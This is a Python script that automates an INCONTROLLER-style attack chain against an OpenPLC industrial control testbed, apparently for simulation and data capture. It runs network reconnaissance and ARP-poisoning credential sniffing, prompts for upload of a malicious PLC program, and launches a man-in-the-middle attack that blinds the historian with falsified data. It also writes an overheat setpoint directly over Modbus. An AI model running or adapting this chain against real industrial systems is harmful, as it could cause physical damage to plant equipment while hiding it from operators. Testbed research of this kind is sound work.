# INCONTROLLER Attack Chain Automation Script
# Author: Simulates INCONTROLLER behavior on ICS Testbed

import subprocess
import time

# Configurations
OPENPLC_URL = "http://localhost:4004"
MALICIOUS_PROGRAM = "/usr/src/exploits/heater-malicious.st"

# Phase 1: Network Reconnaissance
def run_network_discovery():
    print("[+] Running Network Reconnaissance...")
    subprocess.run(["python3", "ics_discovery.py"])

# Phase 2: Credential Sniffing via ARP Cache Poisoning
def start_credential_sniffing():
    print("[+] Starting Credential Sniffing...")
    sniff_proc = subprocess.Popen(["python3", "/usr/src/exploits/password_sniff.py"])
    print("[+] Please login to OpenPLC Web UI manually (http://localhost:4004)")
    input("[!] Press Enter after credentials are sniffed...")
    sniff_proc.terminate()

# Phase 3: Upload Malicious PLC Program
def upload_malicious_program():
    print("[+] Uploading Malicious PLC Program...")
    print(f"[!] Manually upload '{MALICIOUS_PROGRAM}' to {OPENPLC_URL} in Programs section.")
    input("[!] Press Enter after uploading & starting PLC...")

# Phase 4: Historian Blinding via MITM Attack
def start_mitm_historian_blinding():
    print("[+] Starting MITM Attack to Blind Historian...")
    mitm_proc = subprocess.Popen(["python3", "/usr/src/exploits/start_mitm_modification_hist_plc.py"])
    print("[+] MITM Attack running. Historian should now show falsified data.")
    return mitm_proc

# Phase 5: (Optional) Direct Modbus Manipulation
def direct_modbus_manipulation():
    from pymodbus.client.sync import ModbusTcpClient
    plc_ip = input("Enter PLC IP (from discovery phase): ")
    client = ModbusTcpClient(plc_ip, port=502)
    client.connect()
    print("[+] Writing Unsafe Setpoint (e.g., Overheat value)...")
    client.write_register(1, 120)
    client.close()

# Data Capture
def start_tcpdump_capture():
    print("[+] Starting TCPDUMP captures on Modbus, OPC UA, and ARP...")
    subprocess.Popen(["tcpdump", "-i", "eth0", "port", "502", "-w", "/tmp/modbus_traffic.pcap"])
    subprocess.Popen(["tcpdump", "-i", "eth0", "port", "4840", "-w", "/tmp/opcua_traffic.pcap"])
    subprocess.Popen(["tcpdump", "-i", "eth0", "arp", "-w", "/tmp/arp_spoofing.pcap"])

# Main Execution Flow
def main():
    run_network_discovery()
    start_tcpdump_capture()
    start_credential_sniffing()
    upload_malicious_program()
    mitm_proc = start_mitm_historian_blinding()

    action = input("[?] Do you want to perform direct Modbus manipulation? (y/n): ")
    if action.lower() == 'y':
        direct_modbus_manipulation()

    print("[+] Attack Chain Complete. Press Ctrl+C to stop MITM and TCPDUMP captures.")
    try:
        mitm_proc.wait()
    except KeyboardInterrupt:
        mitm_proc.terminate()
        print("[+] MITM attack stopped.")

if __name__ == "__main__":
    main()
